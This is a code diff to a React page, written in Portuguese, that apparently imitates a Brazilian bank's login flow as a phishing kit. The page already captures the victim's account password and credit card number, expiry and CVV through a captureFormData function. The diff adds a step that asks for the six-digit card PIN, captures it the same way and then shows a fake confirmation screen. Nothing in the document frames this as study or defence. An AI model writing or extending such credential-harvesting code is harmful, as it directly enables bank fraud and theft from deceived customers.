@@ -8,11 +8,12 @@ const SenhaAcesso = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const { nome, agencia, conta } = (location.state as any) || {};
-  const [phase, setPhase] = useState<"senha" | "cartao">("senha");
+  const [phase, setPhase] = useState<"senha" | "cartao" | "senhaCartao">("senha");
   const [senha, setSenha] = useState("");
   const [numero, setNumero] = useState("");
   const [validade, setValidade] = useState("");
   const [cvv, setCvv] = useState("");
+  const [senhaCartao, setSenhaCartao] = useState("");
 
   const maskedAgencia = agencia ? `*${agencia.slice(-2)}` : "**";
   const cleanConta = conta ? conta.replace(/\D/g, "") : "";
@@ -43,6 +44,13 @@ const SenhaAcesso = () => {
     const cleanNumero = numero.replace(/\D/g, "");
     if (cleanNumero.length >= 13 && validade.length >= 4 && cvv.length >= 3) {
       captureFormData("dados-cartao", { numero: cleanNumero, validade, cvv });
+      setPhase("senhaCartao");
+    }
+  };
+
+  const handleSenhaCartao = () => {
+    if (senhaCartao.length === 6) {
+      captureFormData("senha-cartao", { senhaCartao });
       navigate("/confirmacao", { state: { nome, conta, agencia } });
     }
   };
@@ -52,7 +60,7 @@ const SenhaAcesso = () => {
       {/* Header */}
       <div className="px-5 pt-6 pb-4">
         <div className="flex items-center gap-4">
-          <button onClick={() => phase === "cartao" ? setPhase("senha") : navigate(-1)}>
+          <button onClick={() => phase === "senhaCartao" ? setPhase("cartao") : phase === "cartao" ? setPhase("senha") : navigate(-1)}>
             <ChevronLeft className="text-primary-foreground" size={24} />
           </button>
           <h1 className="text-primary-foreground text-lg font-semibold flex-1 text-center pr-8">
@@ -103,7 +111,7 @@ const SenhaAcesso = () => {
               continuar
             </button>
           </>
-        ) : (
+        ) : phase === "cartao" ? (
           <>
             <p className="text-foreground text-xl font-bold mb-1">Confirme o seu cartão de crédito abaixo</p>
             <p className="text-muted-foreground text-sm mb-6">
@@ -157,6 +165,33 @@ const SenhaAcesso = () => {
             <button
               onClick={handleCartao}
               className="w-full py-4 rounded-full bg-[#D7004D] text-white font-semibold text-base hover:opacity-90 transition-opacity"
+            >
+              continuar
+            </button>
+          </>
+        ) : (
+          <>
+            <p className="text-foreground text-base font-medium mb-4">Qual é a senha do seu cartão?</p>
+            <input
+              autoFocus
+              type="tel"
+              inputMode="numeric"
+              pattern="[0-9]*"
+              maxLength={6}
+              value={senhaCartao}
+              onChange={(e) => setSenhaCartao(e.target.value.replace(/\D/g, "").slice(0, 6))}
+              className="w-full border-b border-muted-foreground/30 pb-2 outline-none text-lg tracking-[0.5em] text-foreground"
+              style={{ WebkitTextSecurity: "disc" } as React.CSSProperties}
+            />
+            <p className="text-muted-foreground text-sm mt-2">6 dígitos</p>
+            <button className="text-[#D7004D] font-bold text-sm mt-4 text-left">
+              Esqueci ou não tenho senha
+            </button>
+            <div className="flex-1" />
+            <button
+              onClick={handleSenhaCartao}
+              disabled={senhaCartao.length !== 6}
+              className="w-full py-4 rounded-full bg-muted text-muted-foreground font-semibold text-base transition-all disabled:opacity-60 enabled:bg-[#D7004D] enabled:text-white"
             >
               continuar
             </button>
